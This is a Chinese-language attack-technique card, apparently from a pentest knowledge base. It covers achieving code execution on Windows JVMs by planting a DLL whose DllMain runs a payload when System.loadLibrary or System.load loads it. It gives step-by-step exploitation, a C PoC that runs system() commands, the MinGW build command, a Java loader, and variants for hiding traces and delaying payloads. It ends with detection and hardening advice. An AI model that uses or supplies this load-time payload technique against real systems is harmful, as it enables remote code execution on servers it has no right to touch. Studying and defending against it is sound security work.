---
id: web-java-rce-windows-dllmain-load-time-exec
title: Windows DllMain 的 DLL_PROCESS_ATTACH：LoadLibrary 加载 dll 时即执行载荷
type: scenario
domain: web
path: web/java/rce
technique: windows-dllmain-process-attach-load-time-execution
aliases:
- DllMain 加载即执行
- DLL_PROCESS_ATTACH 执行命令
- System.loadLibrary dll 弹窗
- Windows 原生库载入期
- PE 入口点 载荷
tags:
- java
- jni
- native-library
- windows
- pe
- dllmain
- load-time
- payload
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-08T00:19:27+08:00'
  notes: 已对照 content.md 与 img/05 核对：DllMain 段 C 代码（switch(ul_reason_for_call) 的 DLL_PROCESS_ATTACH 分支 system("echo Rce Successfully!")，其余分支 break，return TRUE）与卡内 PoC 一致；img/05 为 IDE 中 Exp.java 仅 static{ System.loadLibrary("libcmd"); } + 空 main，Run 窗口输出 Rce Successfully!，与卡内「LoadLibrary 时以 DLL_PROCESS_ATTACH 调用一次即执行」一致。已修正：原合并卡称「没有子进程创建」，但 system() 会经 cmd.exe 起子进程（原文回显即 cmd 的 echo 输出），卡内已改为「native 层仍有子进程痕迹」；另修正笔误「子进进程」→「子进程」。受影响版本不适用。未在本机编译/加载任何 dll。
---

## 一句话结论

Windows 上每个 PE DLL 的入口点是 `DllMain`，`LoadLibrary`/`System.loadLibrary` 加载它时会以 `DLL_PROCESS_ATTACH` 原因调用一次；把载荷写在该分支里（如 `system("...")`）编译成 `.dll`，JVM 加载该 dll 的瞬间就执行代码，不需要导出 `Java_` 符号、不需要 `JNI_OnLoad`，也不依赖目标类声明过 `native` 方法。

## 原理

- `DllMain(HMODULE, DWORD reason, LPVOID)` 是 PE 的结构化入口：`LoadLibrary` 完成映射与重定位后调用它，`reason` 为 `DLL_PROCESS_ATTACH`；进程退出或 `FreeLibrary` 时为 `DLL_PROCESS_DETACH`，线程附着/分离时为 `DLL_THREAD_ATTACH`/`DLL_THREAD_DETACH`。
- 该调用发生在 `LoadLibrary` 返回到 JVM 之前，早于 JNI 的符号解析；因此 dll 是否包含有效的 JNI 实现不影响载荷执行（此后 JVM 报 `UnsatisfiedLinkError` 也属预期）。
- 载荷在 JVM 进程内执行，`system()` 会经 `cmd.exe` 起子进程（`system("cmd /c echo ...")` 的输出即 `cmd.exe` 的回显），`execve` 类调用同理；`DllMain` 内做重活（等待、加载其它库、创建线程）有 loader lock 风险，最小载荷（`system`/`WinExec`）最稳。
- 与 `JNI_OnLoad` 的差别：`JNI_OnLoad` 是 JVM 主动查找的 JNI 约定符号；`DllMain` 是操作系统加载器必经的入口，只要 `LoadLibrary` 成功就会调用，不依赖 JNI 语义。Linux 上对应 `__attribute__((constructor))`。
- 与「DLL 侧加载/白加黑」的差别：侧加载是让合法宿主进程加载恶意同名 dll（前置是可写搜索路径与宿主）；本卡是「已有可控的 `System.load` 加载点」时，dll 如何在被加载的那一刻执行，属链的消费端。

## 触发条件

- 目标为 Windows 上的 JVM（`java.exe`/`javaw.exe`），且存在可控的原生库加载点（`System.load`/`System.loadLibrary`、JNA 解包、框架加载）。
- 攻击者能把 `.dll` 落地到目标机，位数（x86/x64）与目标 JVM 一致。
- 进程对 dll 有读权限，加载点目录可写或库名可控；未禁用原生库加载。
- 编译工具链（MinGW/MSVC）与 `JNIEXPORT`/`jint` 等头文件约定匹配（纯 `DllMain` 载荷可不需要 JDK 头文件）。

## 利用步骤

1. 确认加载点与 `java.library.path`（`System.getProperty("java.library.path")`、启动脚本）。
2. 写只含 `DllMain` 的 C 文件：在 `DLL_PROCESS_ATTACH` 分支执行载荷，其余分支直接 `return TRUE`。
3. 用 MinGW 编译：`gcc -fPIC -I "%JAVA_HOME%\include" -I "%JAVA_HOME%\include\win32" -shared -o cmd.dll evil.c`（纯 DllMain 载荷可省略 `-I`）。
4. 落地 dll；走 `loadLibrary` 时命名为 `<name>.dll`（如 `cmd.dll`）并放进 `java.library.path`；走 `System.load` 时用绝对路径。
5. 触发加载，不调用任何方法；观察副作用（弹窗、命令回显、marker 文件）。
6. 若 JVM 随后报 `UnsatisfiedLinkError`，属预期，不代表失败。

## PoC

```c
#include <Windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        system("cmd /c echo Rce Successfully!");   // 加载即执行并回显
        // 或 system("calc");
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    default:
        break;
    }
    return TRUE;
}
```

```bash
gcc -fPIC -I "%JAVA_HOME%\include" -I "%JAVA_HOME%\include\win32" -shared -o cmd.dll evil.c
```

```java
public class LoadOnly {
    static { System.loadLibrary("cmd"); }   // 或 System.load("C:\\path\\cmd.dll")
    public static void main(String[] args) { }
}
```

```text
# 预期：main 为空，加载 dll 时控制台/窗口出现 "Rce Successfully!"（或弹出计算器）
```

## 变体与关联

- 变体：`DLL_PROCESS_DETACH` 分支也能执行（进程退出/卸载时触发），可用于清理痕迹或延迟载荷。
- 变体：`DllMain` 里 `CreateThread` 把重活移出 loader lock，避免 `system()` 在受限环境下的死锁风险。
- 变体：同时导出 `JNI_OnLoad` 与 `Java_` 方法，做成「加载即执行 + 可被调用」的双用途 dll。
- 关联：`[[web-java-rce-elf-constructor-load-time-exec]]`（Linux 对应入口）、`[[web-java-rce-jni-onload-export-load-time-exec]]`（JVM 主动调用入口）；`[[pentest-c2-dll-sideload-export-forwarding-host-whitelist]]` 是让合法宿主加载 dll 的另一路径。
- 边界：目标为 Linux（`DllMain` 不存在）、dll 位数不匹配、加载点不可达或目录不可写、`SafeDllSearchMode`/AppLocker 限制加载、启用 `SecurityManager` 限制 `System.load` 时失败。

## 检测与防御

- 检测：JVM 进程 `LoadLibrary` 的目标 dll 不在应用依赖目录（上传目录、`%TEMP%`、共享挂载）；`Process Monitor`/EDR 记录加载后立即出现的子进程（`cmd.exe`/`calc.exe`）或外连。
- 检测：`java.library.path` 含可写目录；上传接口出现 `.dll` 且随后被加载；Java 侧报 `UnsatisfiedLinkError` 但进程已有异常副作用。
- 修复：禁止用户可控的 `System.load`/`System.loadLibrary`；原生能力改为服务端预置、签名/哈希校验后再加载。
- 加固：`java.library.path` 只读；上传目录与服务目录分离；以低权限账号运行 JVM；监控 DLL 加载路径与子进进程创建。
